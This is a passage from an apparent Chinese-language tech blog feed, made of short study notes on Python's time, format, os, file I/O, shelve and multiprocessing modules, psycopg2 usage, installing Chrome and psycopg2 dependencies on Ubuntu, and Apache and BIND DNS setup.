接受两个参数，前者为格式，后者为时间对象:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">import <span class="hljs-keyword">time</span> <br><br>t = time.localtime()<br><span class="hljs-keyword">print</span>(time.strftime(<span class="hljs-string">&quot;%Y-%m-%d %H: %M: %S&quot;</span>, t))<br></code></pre></td></tr></table></figure><p>其格式有:</p><ul><li><code>%Y</code></li><li><code>%m</code></li><li><code>%d</code></li><li><code>%B</code>, 完整月份名</li><li><code>%b</code>, 简化</li><li><code>%A</code>, 完整星期名</li><li><code>%a</code>, 简化</li><li><code>%H</code></li><li><code>%I</code>, 12 小时制</li><li><code>%p</code>, 上下午</li><li><code>%M</code></li><li><code>%S</code></li></ul><h1 id="perf-counter"><a href="#perf-counter" class="headerlink" title="perf_counter()"></a>perf_counter()</h1><p>记录 CPU 运行时间，返回值以秒为单位.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">time</span><br><br>start = <span class="hljs-type">time</span>.perf_counter()<br>end = <span class="hljs-type">time</span>.perf_counter()<br>print(<span class="hljs-keyword">start</span>)<br>print(<span class="hljs-keyword">end</span>)<br>print(<span class="hljs-keyword">end</span>-<span class="hljs-keyword">start</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中 format 函数用法</title>
    <link href="/2022/08/27/Python-%E4%B8%AD-format-%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/"/>
    <url>/2022/08/27/Python-%E4%B8%AD-format-%E5%87%BD%E6%95%B0%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="通过-index-即位置"><a href="#通过-index-即位置" class="headerlink" title="通过 index 即位置"></a>通过 index 即位置</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;This is a &#123;0&#125; about &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;example&#x27;</span>, <span class="hljs-string">&#x27;format&#x27;</span>))<br>This <span class="hljs-keyword">is</span> a example about <span class="hljs-built_in">format</span><br></code></pre></td></tr></table></figure><p>另一个例子:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; print(<span class="hljs-string">&#x27;&#123;0&#125; two three three two &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;one&#x27;</span>))<br><span class="hljs-literal">one</span> <span class="hljs-literal">two</span> <span class="hljs-literal">three</span> <span class="hljs-literal">three</span> <span class="hljs-literal">two</span> <span class="hljs-literal">one</span><br></code></pre></td></tr></table></figure><p>若不输入数字，则按顺序填充。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; print(<span class="hljs-string">&#x27;&#123;&#125; two three three two &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;one&#x27;</span>))<br><span class="hljs-literal">one</span> <span class="hljs-literal">two</span> <span class="hljs-literal">three</span> <span class="hljs-literal">three</span> <span class="hljs-literal">two</span> <span class="hljs-literal">one</span><br></code></pre></td></tr></table></figure><h1 id="通过-keys-关键词"><a href="#通过-keys-关键词" class="headerlink" title="通过 keys 关键词"></a>通过 keys 关键词</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&gt;&gt;&gt; <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;My name is &#123;name&#125;, a &#123;identity&#125;&#x27;</span>.format(<span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;Jie&#x27;</span>, <span class="hljs-attribute">identity</span>=<span class="hljs-string">&#x27;student&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="通过下标"><a href="#通过下标" class="headerlink" title="通过下标"></a>通过下标</h1><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">data = [<span class="hljs-string">&#x27;Jie&#x27;</span>, <span class="hljs-string">&#x27;student&#x27;</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;My name is &#123;0[0]&#125;, a &#123;0[0]&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(data))</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 安装 Google 浏览器</title>
    <link href="/2022/08/27/Ubuntu-%E5%AE%89%E8%A3%85-Google-%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    <url>/2022/08/27/Ubuntu-%E5%AE%89%E8%A3%85-Google-%E6%B5%8F%E8%A7%88%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>通过源代码安装，进入 <code>https://www.google.cn/chrome/</code> 下载 <code>.deb</code> 包.</p><p>然后:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> ~<span class="hljs-string">/Downloads</span><br>sudo dpkg -i google-chrome-stable_current_amd64.deb<br></code></pre></td></tr></table></figure><p>从命令行打开 Google 浏览器:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">google-chrome</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Ubuntu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装 Python 库 psycopg2 报错</title>
    <link href="/2022/08/27/%E5%AE%89%E8%A3%85-Python-%E5%BA%93-psycopg2-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/08/27/%E5%AE%89%E8%A3%85-Python-%E5%BA%93-psycopg2-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>报错内容为:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">.<span class="hljs-keyword">/psycopg/</span>psycopg.h:<span class="hljs-number">36</span>:<span class="hljs-number">10</span>: fatal error: libpq-fe.h: No such file or directory<br>         <span class="hljs-number">36</span> | <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;libpq-fe.h&gt;</span></span><br>            |          ^~~~~~~~~~~~<br>      compilation terminated.<br></code></pre></td></tr></table></figure><p>因此安装依赖:</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install libpq-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p>然后重新安装:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> psycopg2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 3 连接 PostgreSQL 数据库</title>
    <link href="/2022/08/27/Python-3-%E8%BF%9E%E6%8E%A5-PostgreSQL-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2022/08/27/Python-3-%E8%BF%9E%E6%8E%A5-PostgreSQL-%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p><a href="https://pypi.org/project/psycopg2/">相关文档</a><br>使用 psycopg2 库。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Psycopg2 在 C 中作为 libpg 包装器实现的。其兼容 Unicode 和 Python3.</p><h1 id="Basic-module-usage"><a href="#Basic-module-usage" class="headerlink" title="Basic module usage"></a>Basic module usage</h1><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> psycopg2<br><br>conn = psycopg2.<span class="hljs-keyword">connect</span>(&quot;dbname=test user=postgres&quot;)<br>cur = conn.<span class="hljs-keyword">cursor</span><br>cur.<span class="hljs-keyword">execute</span>(&quot;CREATE TABLE test (id serial PRIMARY KEY, num integer, data varchar);&quot;)<br>cur.<span class="hljs-keyword">execute</span>(&quot;INSERT INTO test (num, data) VALUES (%s, %s)&quot;, (<span class="hljs-number">100</span>, &quot;abc&#x27;def&quot;))<br>cur.<span class="hljs-keyword">execute</span>(&quot;SELECT * FROM test;&quot;)<br>cur.fetchone()<br>conn.<span class="hljs-keyword">commit</span>()<br>cur.<span class="hljs-keyword">close</span>()<br>conn.<span class="hljs-keyword">close</span>()<br></code></pre></td></tr></table></figure><p><code>connect()</code> 方法能够创建一个 session, 然后返回一个 connection instance.</p><p><code>connect()</code> 方法的参数:</p><ul><li>dbname, 数据库名称</li><li>database, 同样是数据库名称</li><li>user，用于验证的用户名</li><li>password, 密码</li><li>host, 主机地址</li><li>port, 连接的端口号</li></ul><p>使用类似于 <code>connect(host=&#39;localhost&#39;, database=&quot;test&quot;, user=&quot;postgres&quot;)</code></p><p><code>connection</code> 是一个类，其 <code>cursor()</code> 方法创建一个 cursor instance, 其可用来执行数据库命令和查询。如使用 <code>execute()</code> 或 <code>executemany</code> 方法来执行命令， 用 <code>fetchmany()</code> 或 <code>fetchall()</code> 或 <code>fetchone()</code> 方法来 retrieve data from database。</p><p><code>commit()</code> 和 <code>rollback()</code> 方法用于停止一个 transactions.</p><h1 id="Passing-parameters-to-SQL-queries"><a href="#Passing-parameters-to-SQL-queries" class="headerlink" title="Passing parameters to SQL queries"></a>Passing parameters to SQL queries</h1><p>使用 <code>execute()</code> 方法与 <code>%s</code>:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cur.execute(<span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    INSERT INTO some_table (an_int, a_date, a_string)</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    VALUES (%s, %s, %s);</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    &quot;&quot;&quot;</span>,</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    (<span class="hljs-number">10</span>, datetime.date(<span class="hljs-number">2005</span>, <span class="hljs-number">11</span>, <span class="hljs-number">18</span>), <span class="hljs-string">&quot;O&#x27;Reilly&quot;</span>))</span><br></code></pre></td></tr></table></figure><p>可以使用 named arguments <code>%(name)s</code>, 其顺序可以和 <code>VALUES</code> 不同，且可被重复使用:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">cur.execute(<span class="hljs-string">&quot;&quot;&quot;</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    INSERT INTO some_table (an_int, a_date, a_string)</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    VALUES (%(int)s, %(date)s, %(date)s, %(str)s);</span></span><br><span class="hljs-meta prompt_">...</span> <span class="language-python"><span class="hljs-string">    &quot;&quot;&quot;</span>,</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    &#123;<span class="hljs-string">&#x27;int&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;str&#x27;</span>: <span class="hljs-string">&quot;O&#x27;Reilly&quot;</span>, <span class="hljs-string">&#x27;date&#x27;</span>: datetime.date(<span class="hljs-number">2005</span>, <span class="hljs-number">11</span>, <span class="hljs-number">18</span>)&#125;)</span><br></code></pre></td></tr></table></figure><p>这里的 <code>date</code> 就被使用了两次。且这里用的是字典。</p><p>表示 <code>%</code> 需要使用 <code>%%</code>:</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-string">&quot;SELECT (%s %% 2) = 0 AS even&quot;</span><span class="hljs-punctuation">,</span> (<span class="hljs-number">10</span><span class="hljs-punctuation">,</span>)<br></code></pre></td></tr></table></figure><p>注意第二个参数必须为 sequence, 因此要写为 <code>(10,)</code> 或 <code>[10]</code></p><p>这里的 placeholder 必须是 <code>%s</code> 而不能是其他。</p><p>若需要动态查询，需要:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cur<span class="hljs-selector-class">.execute</span>(<br>    <span class="hljs-built_in">SQL</span>(<span class="hljs-string">&quot;INSERT INTO &#123;&#125; VALUES (%s)&quot;</span>)<span class="hljs-selector-class">.format</span>(<span class="hljs-built_in">Identifier</span>(<span class="hljs-string">&#x27;number&#x27;</span>)),<br>    (<span class="hljs-number">10</span>,))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL 必知必会 Notes</title>
    <link href="/2022/08/27/MySQL-%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A-Notes/"/>
    <url>/2022/08/27/MySQL-%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A-Notes/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中 with open 用法</title>
    <link href="/2022/08/27/Python-%E4%B8%AD-with-open-%E7%94%A8%E6%B3%95/"/>
    <url>/2022/08/27/Python-%E4%B8%AD-with-open-%E7%94%A8%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>open() 的几个 mode:</p><ul><li>‘r’</li><li>‘w’</li><li>‘a’</li><li>‘r+’</li></ul><h1 id="使用-with-关键词"><a href="#使用-with-关键词" class="headerlink" title="使用 with 关键词"></a>使用 with 关键词</h1><p>使用 with 可以不用担心 file.close() 问题。其在使用完毕后会自动关闭文件。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">with</span> open(&#x27;filename&#x27;, &#x27;mode&#x27;) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-class"><span class="hljs-keyword">data</span> = f.read()</span><br>    print(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 编程从认知到实践</title>
    <link href="/2022/08/26/Python-%E7%BC%96%E7%A8%8B%E4%BB%8E%E8%AE%A4%E7%9F%A5%E5%88%B0%E5%AE%9E%E8%B7%B5/"/>
    <url>/2022/08/26/Python-%E7%BC%96%E7%A8%8B%E4%BB%8E%E8%AE%A4%E7%9F%A5%E5%88%B0%E5%AE%9E%E8%B7%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="第8章-读写文件"><a href="#第8章-读写文件" class="headerlink" title="第8章 读写文件"></a>第8章 读写文件</h1><h2 id="8-1-文件与文件路径"><a href="#8-1-文件与文件路径" class="headerlink" title="8.1 文件与文件路径"></a>8.1 文件与文件路径</h2><h3 id="8-1-1-Windows-上的倒斜杠以及-OS-X-和-Linux-上的正斜杠"><a href="#8-1-1-Windows-上的倒斜杠以及-OS-X-和-Linux-上的正斜杠" class="headerlink" title="8.1.1 Windows 上的倒斜杠以及 OS X 和 Linux 上的正斜杠"></a>8.1.1 Windows 上的倒斜杠以及 OS X 和 Linux 上的正斜杠</h3><p>如果想程序运行在所有操作系统上，在编写 Python 脚本时，就必须处理这两种情况。</p><h3 id="8-1-3-绝对路径与相对路径"><a href="#8-1-3-绝对路径与相对路径" class="headerlink" title="8.1.3 绝对路径与相对路径"></a>8.1.3 绝对路径与相对路径</h3><h2 id="8-2-文件读写过程"><a href="#8-2-文件读写过程" class="headerlink" title="8.2 文件读写过程"></a>8.2 文件读写过程</h2><p>在 Python 中，读写文件有 3 个步骤:</p><ol><li>调用 open() 函数，返回一个 File 对象</li><li>调用 File 对象的 read() 或 write() 方法</li><li>调用 File 对象的 close() 方法，关闭该文件</li></ol><h3 id="8-2-1-用-open-函数打开文件"><a href="#8-2-1-用-open-函数打开文件" class="headerlink" title="8.2.1 用 open() 函数打开文件"></a>8.2.1 用 open() 函数打开文件</h3><p>第一个参数是路径，第二个参数是模式.</p><h3 id="8-2-2-读取文件内容"><a href="#8-2-2-读取文件内容" class="headerlink" title="8.2.2 读取文件内容"></a>8.2.2 读取文件内容</h3><p>用 read() 函数。</p><p>用 readlines() 方法，可以取得一个列表，其元素是一个字符串，即文本中的一行.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">sonnetFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sonnet29.txt&#x27;</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">sonnetFile.readline()</span><br></code></pre></td></tr></table></figure><h3 id="8-2-3-写入文件"><a href="#8-2-3-写入文件" class="headerlink" title="8.2.3 写入文件"></a>8.2.3 写入文件</h3><p>写模式为 ‘w’, 添加模式为 ‘a’.</p><h2 id="8-3-用-shelve-模块保存变量"><a href="#8-3-用-shelve-模块保存变量" class="headerlink" title="8.3 用 shelve 模块保存变量"></a>8.3 用 shelve 模块保存变量</h2><p>利用 shelve 模块，可以将 Python 程序中的变量保存到二进制的 shelf 文件中:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import shelve<br><br>shelfFile = shelve<span class="hljs-selector-class">.open</span>(<span class="hljs-string">&#x27;mydata&#x27;</span>)<br>cats = <span class="hljs-selector-attr">[<span class="hljs-string">&#x27;Zophie&#x27;</span>, <span class="hljs-string">&#x27;Pooka&#x27;</span>, <span class="hljs-string">&#x27;Simon&#x27;</span>]</span><br>shelfFile<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;cats&#x27;</span>]</span> = cats<br>shelfFile<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure><p>调用 shelve.open() 并传入一个文件名，然后将返回的值保存在一个变量中，可以像字典一样操作这个变量，完成时需要调用 close().</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中 os 库</title>
    <link href="/2022/08/26/Python-%E4%B8%AD-os-%E5%BA%93/"/>
    <url>/2022/08/26/Python-%E4%B8%AD-os-%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h1><h2 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a>getcwd()</h2><p>获取当前工作路径。</p><h2 id="listdir-path"><a href="#listdir-path" class="headerlink" title="listdir(path)"></a>listdir(path)</h2><p>返回 <code>path</code> 下的文件和目录组成的列表，类似 Linux 命令 <code>ls</code></p><h2 id="walk-path"><a href="#walk-path" class="headerlink" title="walk(path)"></a>walk(path)</h2><p>遍历指定 <code>path</code> 下的所有目录，返回由路径、文件夹、文件 三个列表组成的元组。</p><h2 id="path-exists-path"><a href="#path-exists-path" class="headerlink" title="path.exists(path)"></a>path.exists(path)</h2><p>判断路径下的目录是否存在，存在返回 Ture.</p><h2 id="mkdir-path"><a href="#mkdir-path" class="headerlink" title="mkdir(path)"></a>mkdir(path)</h2><p>创建一个目录。</p><h2 id="makedirs-path"><a href="#makedirs-path" class="headerlink" title="makedirs(path)"></a>makedirs(path)</h2><p>创建递归目录。</p><h2 id="rmdir-path"><a href="#rmdir-path" class="headerlink" title="rmdir(path)"></a>rmdir(path)</h2><p>删除目录.</p><h2 id="path-join-path1-path2"><a href="#path-join-path1-path2" class="headerlink" title="path.join(path1, path2)"></a>path.join(path1, path2)</h2><p>将两个路径拼接。其会包含正确的路径分隔符.</p><h2 id="path-split-path"><a href="#path-split-path" class="headerlink" title="path.split(path)"></a>path.split(path)</h2><p>将路径拆分为:</p><ul><li>绝对路径, 除文件名部分</li><li>文件名<br>返回元组.</li></ul><h2 id="path-dirname-path"><a href="#path-dirname-path" class="headerlink" title="path.dirname(path)"></a>path.dirname(path)</h2><p>获取文件的绝对路径。</p><h2 id="path-basename-path"><a href="#path-basename-path" class="headerlink" title="path.basename(path)"></a>path.basename(path)</h2><p>只获取文件名.</p><h2 id="path-isdir-path"><a href="#path-isdir-path" class="headerlink" title="path.isdir(path)"></a>path.isdir(path)</h2><p>判断是否是目录。</p><h2 id="path-isfile-path"><a href="#path-isfile-path" class="headerlink" title="path.isfile(path)"></a>path.isfile(path)</h2><p>判断是否为文件。</p><h2 id="path-sep"><a href="#path-sep" class="headerlink" title="path.sep"></a>path.sep</h2><p>返回当前操作系统的路径分隔符。</p><h2 id="path-getsize-path"><a href="#path-getsize-path" class="headerlink" title="path.getsize(path)"></a>path.getsize(path)</h2><p>返回文件大小.</p><h2 id="path-abspath-path"><a href="#path-abspath-path" class="headerlink" title="path.abspath(path)"></a>path.abspath(path)</h2><p>返回参数的绝对路径的字符串。</p><h2 id="path-isabs-path"><a href="#path-isabs-path" class="headerlink" title="path.isabs(path)"></a>path.isabs(path)</h2><p>如果参数是一个绝对路径，就返回 Ture.</p><h2 id="path-relpath-path-start"><a href="#path-relpath-path-start" class="headerlink" title="path.relpath(path, start)"></a>path.relpath(path, start)</h2><p>返回从 start 路径到 path 的相对路径的字符串，若未指定 start, 就使用当前工作目录.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 中 multiprocessing 库使用</title>
    <link href="/2022/08/26/Python-%E4%B8%AD-multiprocessing-%E5%BA%93%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/26/Python-%E4%B8%AD-multiprocessing-%E5%BA%93%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>爬虫时单线程比较慢，使用 <code>multiprocessing</code> 库可以实现多进程.</p><p>常用组件:</p><h1 id="Process-类"><a href="#Process-类" class="headerlink" title="Process 类"></a>Process 类</h1><p>Process 类用于创建进程对象，需传入</p><ul><li>需要执行的函数, 传给 <code>target</code> </li><li>函数的参数, 传给 <code>args</code></li></ul><p>创建好一个 Process 实例后可以使用 <code>start()</code> 方法启动。</p><p>语法:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">Process([<span class="hljs-params">group</span>], [<span class="hljs-params">target</span>], [<span class="hljs-params">name</span>], [<span class="hljs-params">args</span>], [<span class="hljs-params">kwargs</span>])</span><br></code></pre></td></tr></table></figure><p>其中:</p><ul><li>group, 指定进程组</li><li>target, 传递函数</li><li>name，指定进程名字</li><li>args, 以元组的方式传递参数</li><li>kwargs, 以字典的方式给 target 指定的函数传递参数</li></ul><p>常用方法:</p><ul><li>start(), 启动实例</li><li>is_alive(), 判断进程是否还存在</li><li>join([timeout]), 是否等待进程执行结束，或等待多少秒</li><li>terminate(), 终止子进程</li></ul><p>常用属性:</p><ul><li>name, 进程别名</li><li>pid, 进程号</li></ul><h1 id="进程池-Pool-和-map"><a href="#进程池-Pool-和-map" class="headerlink" title="进程池 Pool() 和 map()"></a>进程池 Pool() 和 map()</h1><p>Processing Pool, 用于创建多个进程.</p><p> 定义一个 Pool:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">import multiprocessing<br><br><span class="hljs-attribute">pool</span> <span class="hljs-operator">=</span> multiprocessing.Pool<br></code></pre></td></tr></table></figure><p>此时 <code>pool</code> 为一个 Processing pool，其会根据当前运行环境来决定运行多少个进程，并把每次调用分别变成一个进程，例如 CPU 有 8 个核, 那么进程池的大小就会默认设置为 8.</p><p>利用 <code>map()</code> 方法，向 Processing pool 中传递函数和参数:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">result = pool.<span class="hljs-keyword">map</span>(<span class="hljs-function"><span class="hljs-keyword">func</span>, <span class="hljs-title">range</span><span class="hljs-params">(10)</span></span>)<br></code></pre></td></tr></table></figure><p>这里的参数应该是一个列表，包含每一次调用所需要的参数。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 就该这么学</title>
    <link href="/2022/08/26/Linux-%E5%B0%B1%E8%AF%A5%E8%BF%99%E4%B9%88%E5%AD%A6/"/>
    <url>/2022/08/26/Linux-%E5%B0%B1%E8%AF%A5%E8%BF%99%E4%B9%88%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="第10章-使用-Apache-服务部署静态网站"><a href="#第10章-使用-Apache-服务部署静态网站" class="headerlink" title="第10章 使用 Apache  服务部署静态网站"></a>第10章 使用 Apache  服务部署静态网站</h1><h2 id="10-1-网站服务程序"><a href="#10-1-网站服务程序" class="headerlink" title="10.1 网站服务程序"></a>10.1 网站服务程序</h2><p>安装 apache 服务程序:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> apache2<br></code></pre></td></tr></table></figure><p>默认界面的地址为 <code>http;//127.0.0.1</code></p><h2 id="10-2-配置服务文件参数"><a href="#10-2-配置服务文件参数" class="headerlink" title="10.2 配置服务文件参数"></a>10.2 配置服务文件参数</h2><h1 id="第13章-使用-BIND-提供域名解析服务"><a href="#第13章-使用-BIND-提供域名解析服务" class="headerlink" title="第13章 使用 BIND 提供域名解析服务"></a>第13章 使用 BIND 提供域名解析服务</h1><h2 id="13-1-DNS-域名解析服务"><a href="#13-1-DNS-域名解析服务" class="headerlink" title="13.1 DNS 域名解析服务"></a>13.1 DNS 域名解析服务</h2><p>DNS，即 Domian Name System. 用于管理和解析域名与 IP 地址对应关系的技术.</p><p>将域名解析为 IP 地址，即正向解析。将 IP 地址解析为域名，即反向解析.</p><p>域名后缀一般分为:</p><ul><li>国际域名</li><li>国内域名<br>常见域名有:</li><li>.com : 商业组织</li><li>.org : 非营利组织</li><li>.gov : 政府部门</li><li>.net : 网络服务商</li><li>.edu : 教育机构</li><li>.pub : 公共大众</li><li>.cn : 中国国家顶级域名</li></ul><h2 id="13-2-安装-bind-服务程序"><a href="#13-2-安装-bind-服务程序" class="headerlink" title="13.2 安装 bind 服务程序"></a>13.2 安装 bind 服务程序</h2><p>BIND (Berkeley Internet Name Domain, 伯克利因特网名称域) 服务是全球范围内使用最广泛、最安全可靠且高效的域名解析服务程序. 可加上 chroot (牢笼机制) 扩展包，以便有效地限制 bind 服务程序仅能对自身的配置文件进行操作，以确保整个服务器的安全。</p><p>bind 服务程序下有三个比较关键的文件:</p><ul><li>主配置文件 (&#x2F;etc&#x2F;named.conf) :其参数用来定义 bind 服务程序的运行</li><li>区域配置文件 (&#x2F;etc&#x2F;named.rfc1912.zones) :用来保存域名和 IP 地址对应关系的所在位置，没有包含具体的域名、IP 地址对应关系等信息: 服务类型有三种:<ul><li>hint (根区域)</li><li>master (主区域) 即主服务器</li><li>slave (辅助区域) 即从服务器</li></ul></li><li></li><li>数据配置文件 (&#x2F;var&#x2F;named) :用来保存域名和 IP 地址真是对应关系的数据配置文件<br>在 Linux 系统中，bind 服务程序的名称为 named.</li></ul><p><code>named-checkconf</code> 